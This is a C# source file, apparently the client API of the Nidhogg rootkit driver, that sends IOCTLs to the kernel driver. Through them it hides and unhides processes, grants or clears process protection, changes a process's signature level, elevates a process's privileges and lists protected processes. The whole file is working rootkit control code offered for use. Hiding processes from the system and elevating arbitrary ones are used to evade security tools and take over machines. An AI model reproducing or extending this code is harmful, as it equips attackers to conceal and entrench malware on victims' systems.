using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using static NidhoggCSharpApi.NidhoggApi;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private NidhoggErrorCodes ProcessProtection(uint pid, bool protect)
        {
            ProtectedProcess protectedProcess = new ProtectedProcess
            {
                Pid = pid,
                Protect = protect
            };

            return NidhoggSendDataIoctl(protectedProcess, IOCTL_PROTECT_UNPROTECT_PROCESS);
        }

        private NidhoggErrorCodes ProcessHiding(uint pid, bool hide)
        {
            HiddenProcess hiddenProcess = new HiddenProcess
            {
                Pid = pid,
                Hide = hide
            };
            return NidhoggSendDataIoctl(hiddenProcess, IOCTL_HIDE_UNHIDE_PROCESS);
        }

        public NidhoggErrorCodes ProcessProtect(uint pid)
        {
            return ProcessProtection(pid, true);
        }

        public NidhoggErrorCodes ProcessUnprotect(uint pid)
        {
            return ProcessProtection(pid, false);
        }

        public NidhoggErrorCodes ProcessHide(uint pid)
        {
            return ProcessHiding(pid, true);
        }

        public NidhoggErrorCodes ProcessUnhide(uint pid)
        {
            return ProcessHiding(pid, false);
        }

        public NidhoggErrorCodes ProcessClearAllProtection()
        {
            if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_PROCESS_PROTECTION,
                IntPtr.Zero, 0, IntPtr.Zero, 0, out uint _, IntPtr.Zero))
                return NidhoggErrorCodes.NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

            return NidhoggErrorCodes.NIDHOGG_SUCCESS;
        }

        public NidhoggErrorCodes ProcessSetProtection(uint pid, byte signerType, byte signatureSigner)
        {
            ProcessSignature processSignature;

            processSignature = new ProcessSignature
            {
                Pid = pid,
                SignerType = signerType,
                SignatureSigner = signatureSigner
            };
            return NidhoggSendDataIoctl(processSignature, IOCTL_SET_PROCESS_SIGNATURE_LEVEL);
        }

        public NidhoggErrorCodes ProcessElevate(uint pid)
        {
            return NidhoggSendDataIoctl(pid, IOCTL_ELEVATE_PROCESS);
        }

        public uint[] QueryProtectedProcesses()
        {
            OutputProtectedProcessesList processesList;
            uint[] processes;

            processesList = new OutputProtectedProcessesList
            {
                PidsCount = 0
            };

            processesList = NidhoggRecieveDataIoctl(processesList, IOCTL_QUERY_PROTECTED_PROCESSES);

            if (processesList.PidsCount == 0)
                return null;
            processes = new uint[processesList.PidsCount];

            for (int i = 0; i < processesList.PidsCount; i++)
            {
                processes[i] = processesList.Processes[i];
            }

            return processes;
        }
    }
}